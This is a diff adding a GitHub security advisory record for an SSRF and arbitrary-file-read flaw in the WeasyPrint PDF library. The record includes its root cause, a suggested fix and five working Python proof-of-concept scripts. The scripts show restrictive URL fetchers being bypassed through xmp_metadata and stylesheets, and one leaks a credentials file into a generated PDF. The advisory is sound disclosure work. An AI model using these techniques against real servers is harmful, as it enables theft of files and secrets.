@@ -1,0 +1,170 @@
+{
+  "id": "GHSA-jf6q-chmf-3h3v",
+  "modified": "2026-09-09T18:15:05.021842021Z",
+  "published": "2026-09-09T18:06:38Z",
+  "aliases": [
+    "CVE-2026-55073"
+  ],
+  "summary": "weasyprint Has Server-Side Request Forgery (SSRF)",
+  "details": "## Summary\n\n`url_fetcher` is WeasyPrint's documented mechanism for restricting resource loading - applications use it to block `file://`, internal hosts, etc. when rendering untrusted input.\n\nTwo `write_pdf()` channels ignore the document's `url_fetcher` and build a fresh default `URLFetcher()` instead. A restrictive fetcher set on `HTML()` is silently bypassed for:\n\n- **`xmp_metadata=[url]`** - the URL is fetched and the bytes are embedded verbatim in the output PDF. This is an **arbitrary local file read** when the path is attacker-influenced.\n- **`stylesheets=[url_or_path]`** - the sheet is fetched and applied. This is **SSRF / arbitrary local-or-internal resource loading**, and it is **transitive**: the permissive fetcher propagates through the whole `@import` / `url()` graph.\n\nApplications affected are those that (1) run WeasyPrint server-side, (2) set a restrictive `url_fetcher` to block `file://` or internal hosts, and (3) forward an attacker-influenced URL/path into either parameter - e.g. PDF rendering APIs, invoice/report generators, document SaaS.\n\n## Affected versions\n\nAll versions through current `main` - v69.0, commit `2945986160dedd97a7547be03805b667964e422a`.\n\n## Root cause\n\n`select_source()` defaults to a fresh fetcher when none is passed (`weasyprint/urls.py`):\n\n```python\ndef select_source(guess=None, filename=None, url=None, ..., url_fetcher=None, ...):\n    ...\n    if url_fetcher is None:\n        url_fetcher = URLFetcher()\n```\n\nFive of the seven resource-loading sites thread the document's fetcher correctly:\n\n- `\u003clink rel=stylesheet\u003e` in `weasyprint/css/__init__.py`\n- `\u003cstyle\u003e` in `weasyprint/css/__init__.py`\n- `@import` in `weasyprint/css/__init__.py`\n- `@font-face` / `local()` in `weasyprint/text/fonts.py`\n- `@color-profile src` in `weasyprint/css/__init__.py`\n- images (`\u003cimg\u003e`, CSS `url()`, SVG) in `weasyprint/images.py`\n\nTwo do **not** — they build a fresh default fetcher instead:\n\n- `write_pdf(xmp_metadata=[...])` in `weasyprint/pdf/__init__.py`\n- `write_pdf(stylesheets=[str])` in `weasyprint/document.py`\n\n**`xmp_metadata`** - `pdf/__init__.py` calls `select_source(url)` with no `url_fetcher`, so the default fetcher runs regardless of what the caller configured:\n\n```python\nif options['xmp_metadata']:\n    for url in options['xmp_metadata']:\n        result = select_source(url)          # no url_fetcher\n```\n\n**`stylesheets`** - `document.py` builds each sheet without passing `url_fetcher`, and `CSS.__init__` then defaults to a fresh `URLFetcher()`:\n\n```python\nfor css in options['stylesheets'] or []:\n    if not hasattr(css, 'matcher'):\n        css = CSS(                            # no url_fetcher=html.url_fetcher\n            guess=css, media_type=html.media_type,\n            font_config=font_config, counter_style=counter_style,\n            color_profiles=color_profiles)\n```\n\nBecause `@import` / `url()` inherit a CSS object's fetcher, the permissive fetcher propagates to the entire import graph - so the bypass is transitive.\n\n## Reproduction\n\nEach script defines a `Block` fetcher that refuses every `file://`, writes its own fixture to a temp dir, and prints a boolean. `True` means the restrictive fetcher was bypassed. No external files or network needed.\n\n### 1 - `xmp_metadata=` reads a `file://` the fetcher blocks\n\n```python\nimport os, tempfile\nfrom weasyprint import HTML\nfrom weasyprint.urls import URLFetcher\n\nclass Block(URLFetcher):\n    def fetch(self, url, headers=None):\n        if url.lower().startswith('file:'):\n            raise ValueError('blocked ' + url)\n        return super().fetch(url, headers)\n\nd = tempfile.mkdtemp()\npath = os.path.join(d, 'secret.xmp')\nopen(path, 'wb').write(b'CANARY_XMP_LEAK_7f3a9c')\npdf = HTML(string='\u003cp\u003ehi\u003c/p\u003e', url_fetcher=Block()).write_pdf(\n    xmp_metadata=['file://' + path], pdf_variant='pdf/a-3b', uncompressed_pdf=True)\nprint('secret file leaked into PDF:', b'CANARY_XMP_LEAK_7f3a9c' in pdf)\n# -\u003e True\n```\n\n(`pdf_variant='pdf/a-3b'` makes the embedded bytes observable in the output; the read happens regardless of variant.)\n\n### 2 - `stylesheets=` applies a blocked `file://` sheet (with control)\n\n```python\nimport os, tempfile\nfrom weasyprint import HTML\nfrom weasyprint.urls import URLFetcher\n\nclass Block(URLFetcher):\n    def fetch(self, url, headers=None):\n        if url.lower().startswith('file:'):\n            raise ValueError('blocked ' + url)\n        return super().fetch(url, headers)\n\nd = tempfile.mkdtemp()\npath = os.path.join(d, 'evil.css')\nopen(path, 'w').write('@page { size: 1234px 5678px }')\n\ndoc = HTML(string='\u003cp\u003ex\u003c/p\u003e', url_fetcher=Block()).render(stylesheets=['file://' + path])\np = doc.pages[0]\nprint('evil.css applied via stylesheets=:', (round(p.width), round(p.height)) == (1234, 5678))\n# -\u003e True\n\n# Control: the same sheet via \u003clink rel=stylesheet\u003e is NOT applied (the fetcher blocks it;\n# WeasyPrint logs and continues), so the page keeps its default A4 size. This confirms the\n# gap is specific to stylesheets= and not a misconfigured fetcher.\nctrl = HTML(string='\u003clink rel=\"stylesheet\" href=\"file://%s\"\u003e\u003cp\u003ex\u003c/p\u003e' % path,\n            url_fetcher=Block()).render()\ncp = ctrl.pages[0]\nprint('control \u003clink\u003e correctly blocked:', (round(cp.width), round(cp.height)) != (1234, 5678))\n# -\u003e True\n```\n\n### 3 - the `stylesheets=` bypass is transitive\n\n```python\nimport os, tempfile\nfrom weasyprint import HTML\nfrom weasyprint.urls import URLFetcher\n\nclass Block(URLFetcher):\n    def fetch(self, url, headers=None):\n        if url.lower().startswith('file:'):\n            raise ValueError('blocked ' + url)\n        return super().fetch(url, headers)\n\nd = tempfile.mkdtemp()\ninner = os.path.join(d, 'inner.css')\nouter = os.path.join(d, 'outer.css')\nopen(inner, 'w').write('@page { size: 333px 777px }')\nopen(outer, 'w').write('@import url(\"file://%s\");' % inner)\ndoc = HTML(string='\u003cp\u003ex\u003c/p\u003e', url_fetcher=Block()).render(stylesheets=['file://' + outer])\np = doc.pages[0]\nprint('nested @import applied transitively:', (round(p.width), round(p.height)) == (333, 777))\n# -\u003e True\n```\n\n### 4 - `xmp_metadata=` discloses a credentials file in full\n\n```python\nimport os, json, tempfile\nfrom weasyprint import HTML\nfrom weasyprint.urls import URLFetcher\n\nclass Block(URLFetcher):\n    def fetch(self, url, headers=None):\n        if url.lower().startswith('file:'):\n            raise ValueError('blocked ' + url)\n        return super().fetch(url, headers)\n\ncreds = {'db_name': 'CANARY_DB_NAME', 'db_password': 'CANARY_PASSWORD_a3f7e9c2',\n         'encryption_key': 'CANARY_ENC_KEY_b8d4f6a1', 'secret_key': 'CANARY_SECRET_KEY_c5e9d2b7'}\nd = tempfile.mkdtemp()\npath = os.path.join(d, 'site_config.json')\njson.dump(creds, open(path, 'w'))\npdf = HTML(string='\u003cp\u003ex\u003c/p\u003e', url_fetcher=Block()).write_pdf(\n    xmp_metadata=['file://' + path], pdf_variant='pdf/a-3b', uncompressed_pdf=True)\nprint('all credential fields leaked into PDF:', all(v.encode() in pdf for v in creds.values()))\n# -\u003e True\n```\n\nAn attacker who controls the `xmp_metadata` path reads any file the rendering process can access and receives its contents in the generated PDF.\n\n### 5 - scope of the `stylesheets=` channel (honest bound)\n\nThe sheet is applied, but its content does not leak verbatim - CSS comments are stripped during parsing. So this channel is SSRF / resource application, **not** verbatim disclosure on its own.\n\n```python\nimport os, tempfile\nfrom weasyprint import HTML\nfrom weasyprint.urls import URLFetcher\n\nclass Block(URLFetcher):\n    def fetch(self, url, headers=None):\n        if url.lower().startswith('file:'):\n            raise ValueError('blocked ' + url)\n        return super().fetch(url, headers)\n\nd = tempfile.mkdtemp()\npath = os.path.join(d, 'secrets.css')\nopen(path, 'w').write('/* CANARY_SECRET_e2a8c5d4 */\\n@page { size: 999px 888px }')\nhtml = HTML(string='\u003cp\u003ex\u003c/p\u003e', url_fetcher=Block())\ndoc = html.render(stylesheets=['file://' + path])\npdf = html.write_pdf(stylesheets=['file://' + path], uncompressed_pdf=True)\np = doc.pages[0]\nprint('sheet applied (bypass):', (round(p.width), round(p.height)) == (999, 888))   # -\u003e True\nprint('comment leaked verbatim:', b'CANARY_SECRET_e2a8c5d4' in pdf)                  # -\u003e False\n```\n\n## Suggested fix\n\nRoute both call sites through the document's `url_fetcher`, matching the five sites that already do this.\n\n- **`pdf/__init__.py`** - `select_source(url, url_fetcher=self.url_fetcher)`. (Alternatively, restrict `xmp_metadata` to byte strings so no URL fetching occurs.)\n- **`document.py`** - `CSS(guess=css, ..., url_fetcher=html.url_fetcher)`. This one change also closes the transitive case, since imported sheets inherit the parent's fetcher.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "weasyprint",
+        "purl": "pkg:pypi/weasyprint"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "70.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1",
+        "0.10",
+        "0.11",
+        "0.12",
+        "0.13",
+        "0.14",
+        "0.15",
+        "0.16",
+        "0.17",
+        "0.17.1",
+        "0.18",
+        "0.19",
+        "0.19.1",
+        "0.19.2",
+        "0.2",
+        "0.2.1",
+        "0.2.2",
+        "0.20",
+        "0.20.1",
+        "0.20.2",
+        "0.21",
+        "0.22",
+        "0.23",
+        "0.24",
+        "0.25",
+        "0.26",
+        "0.27",
+        "0.28",
+        "0.29",
+        "0.3",
+        "0.3.1",
+        "0.30",
+        "0.31",
+        "0.32",
+        "0.33",
+        "0.34",
+        "0.35",
+        "0.36",
+        "0.37",
+        "0.38",
+        "0.39",
+        "0.4",
+        "0.40",
+        "0.41",
+        "0.42",
+        "0.42.1",
+        "0.42.2",
+        "0.42.3",
+        "0.5",
+        "0.6",
+        "0.6.1",
+        "0.7",
+        "0.7.1",
+        "0.8",
+        "0.9",
+        "43",
+        "43rc1",
+        "43rc2",
+        "44",
+        "45",
+        "46",
+        "47",
+        "48",
+        "49",
+        "50",
+        "51",
+        "52",
+        "52.1",
+        "52.2",
+        "52.3",
+        "52.4",
+        "52.5",
+        "53.0",
+        "53.0b1",
+        "53.0b2",
+        "53.1",
+        "53.2",
+        "53.3",
+        "53.4",
+        "54.0",
+        "54.0b1",
+        "54.1",
+        "54.2",
+        "54.3",
+        "55.0",
+        "55.0b1",
+        "56.0",
+        "56.0b1",
+        "56.1",
+        "57.0",
+        "57.0b1",
+        "57.1",
+        "57.2",
+        "58.0",
+        "58.0b1",
+        "58.1",
+        "59.0",
+        "59.0b1",
+        "60.0",
+        "60.1",
+        "60.2",
+        "61.0",
+        "61.1",
+        "61.2",
+        "62.0",
+        "62.1",
+        "62.2",
+        "62.3",
+        "63.0",
+        "63.1",
+        "64.0",
+        "64.1",
+        "65.0",
+        "65.1",
+        "66.0",
+        "67.0",
+        "68.0",
+        "68.1",
+        "69.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-jf6q-chmf-3h3v/GHSA-jf6q-chmf-3h3v.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Kozea/WeasyPrint/security/advisories/GHSA-jf6q-chmf-3h3v"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Kozea/WeasyPrint"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Kozea/WeasyPrint/releases/tag/v70.0"
+    }
+  ]
+}
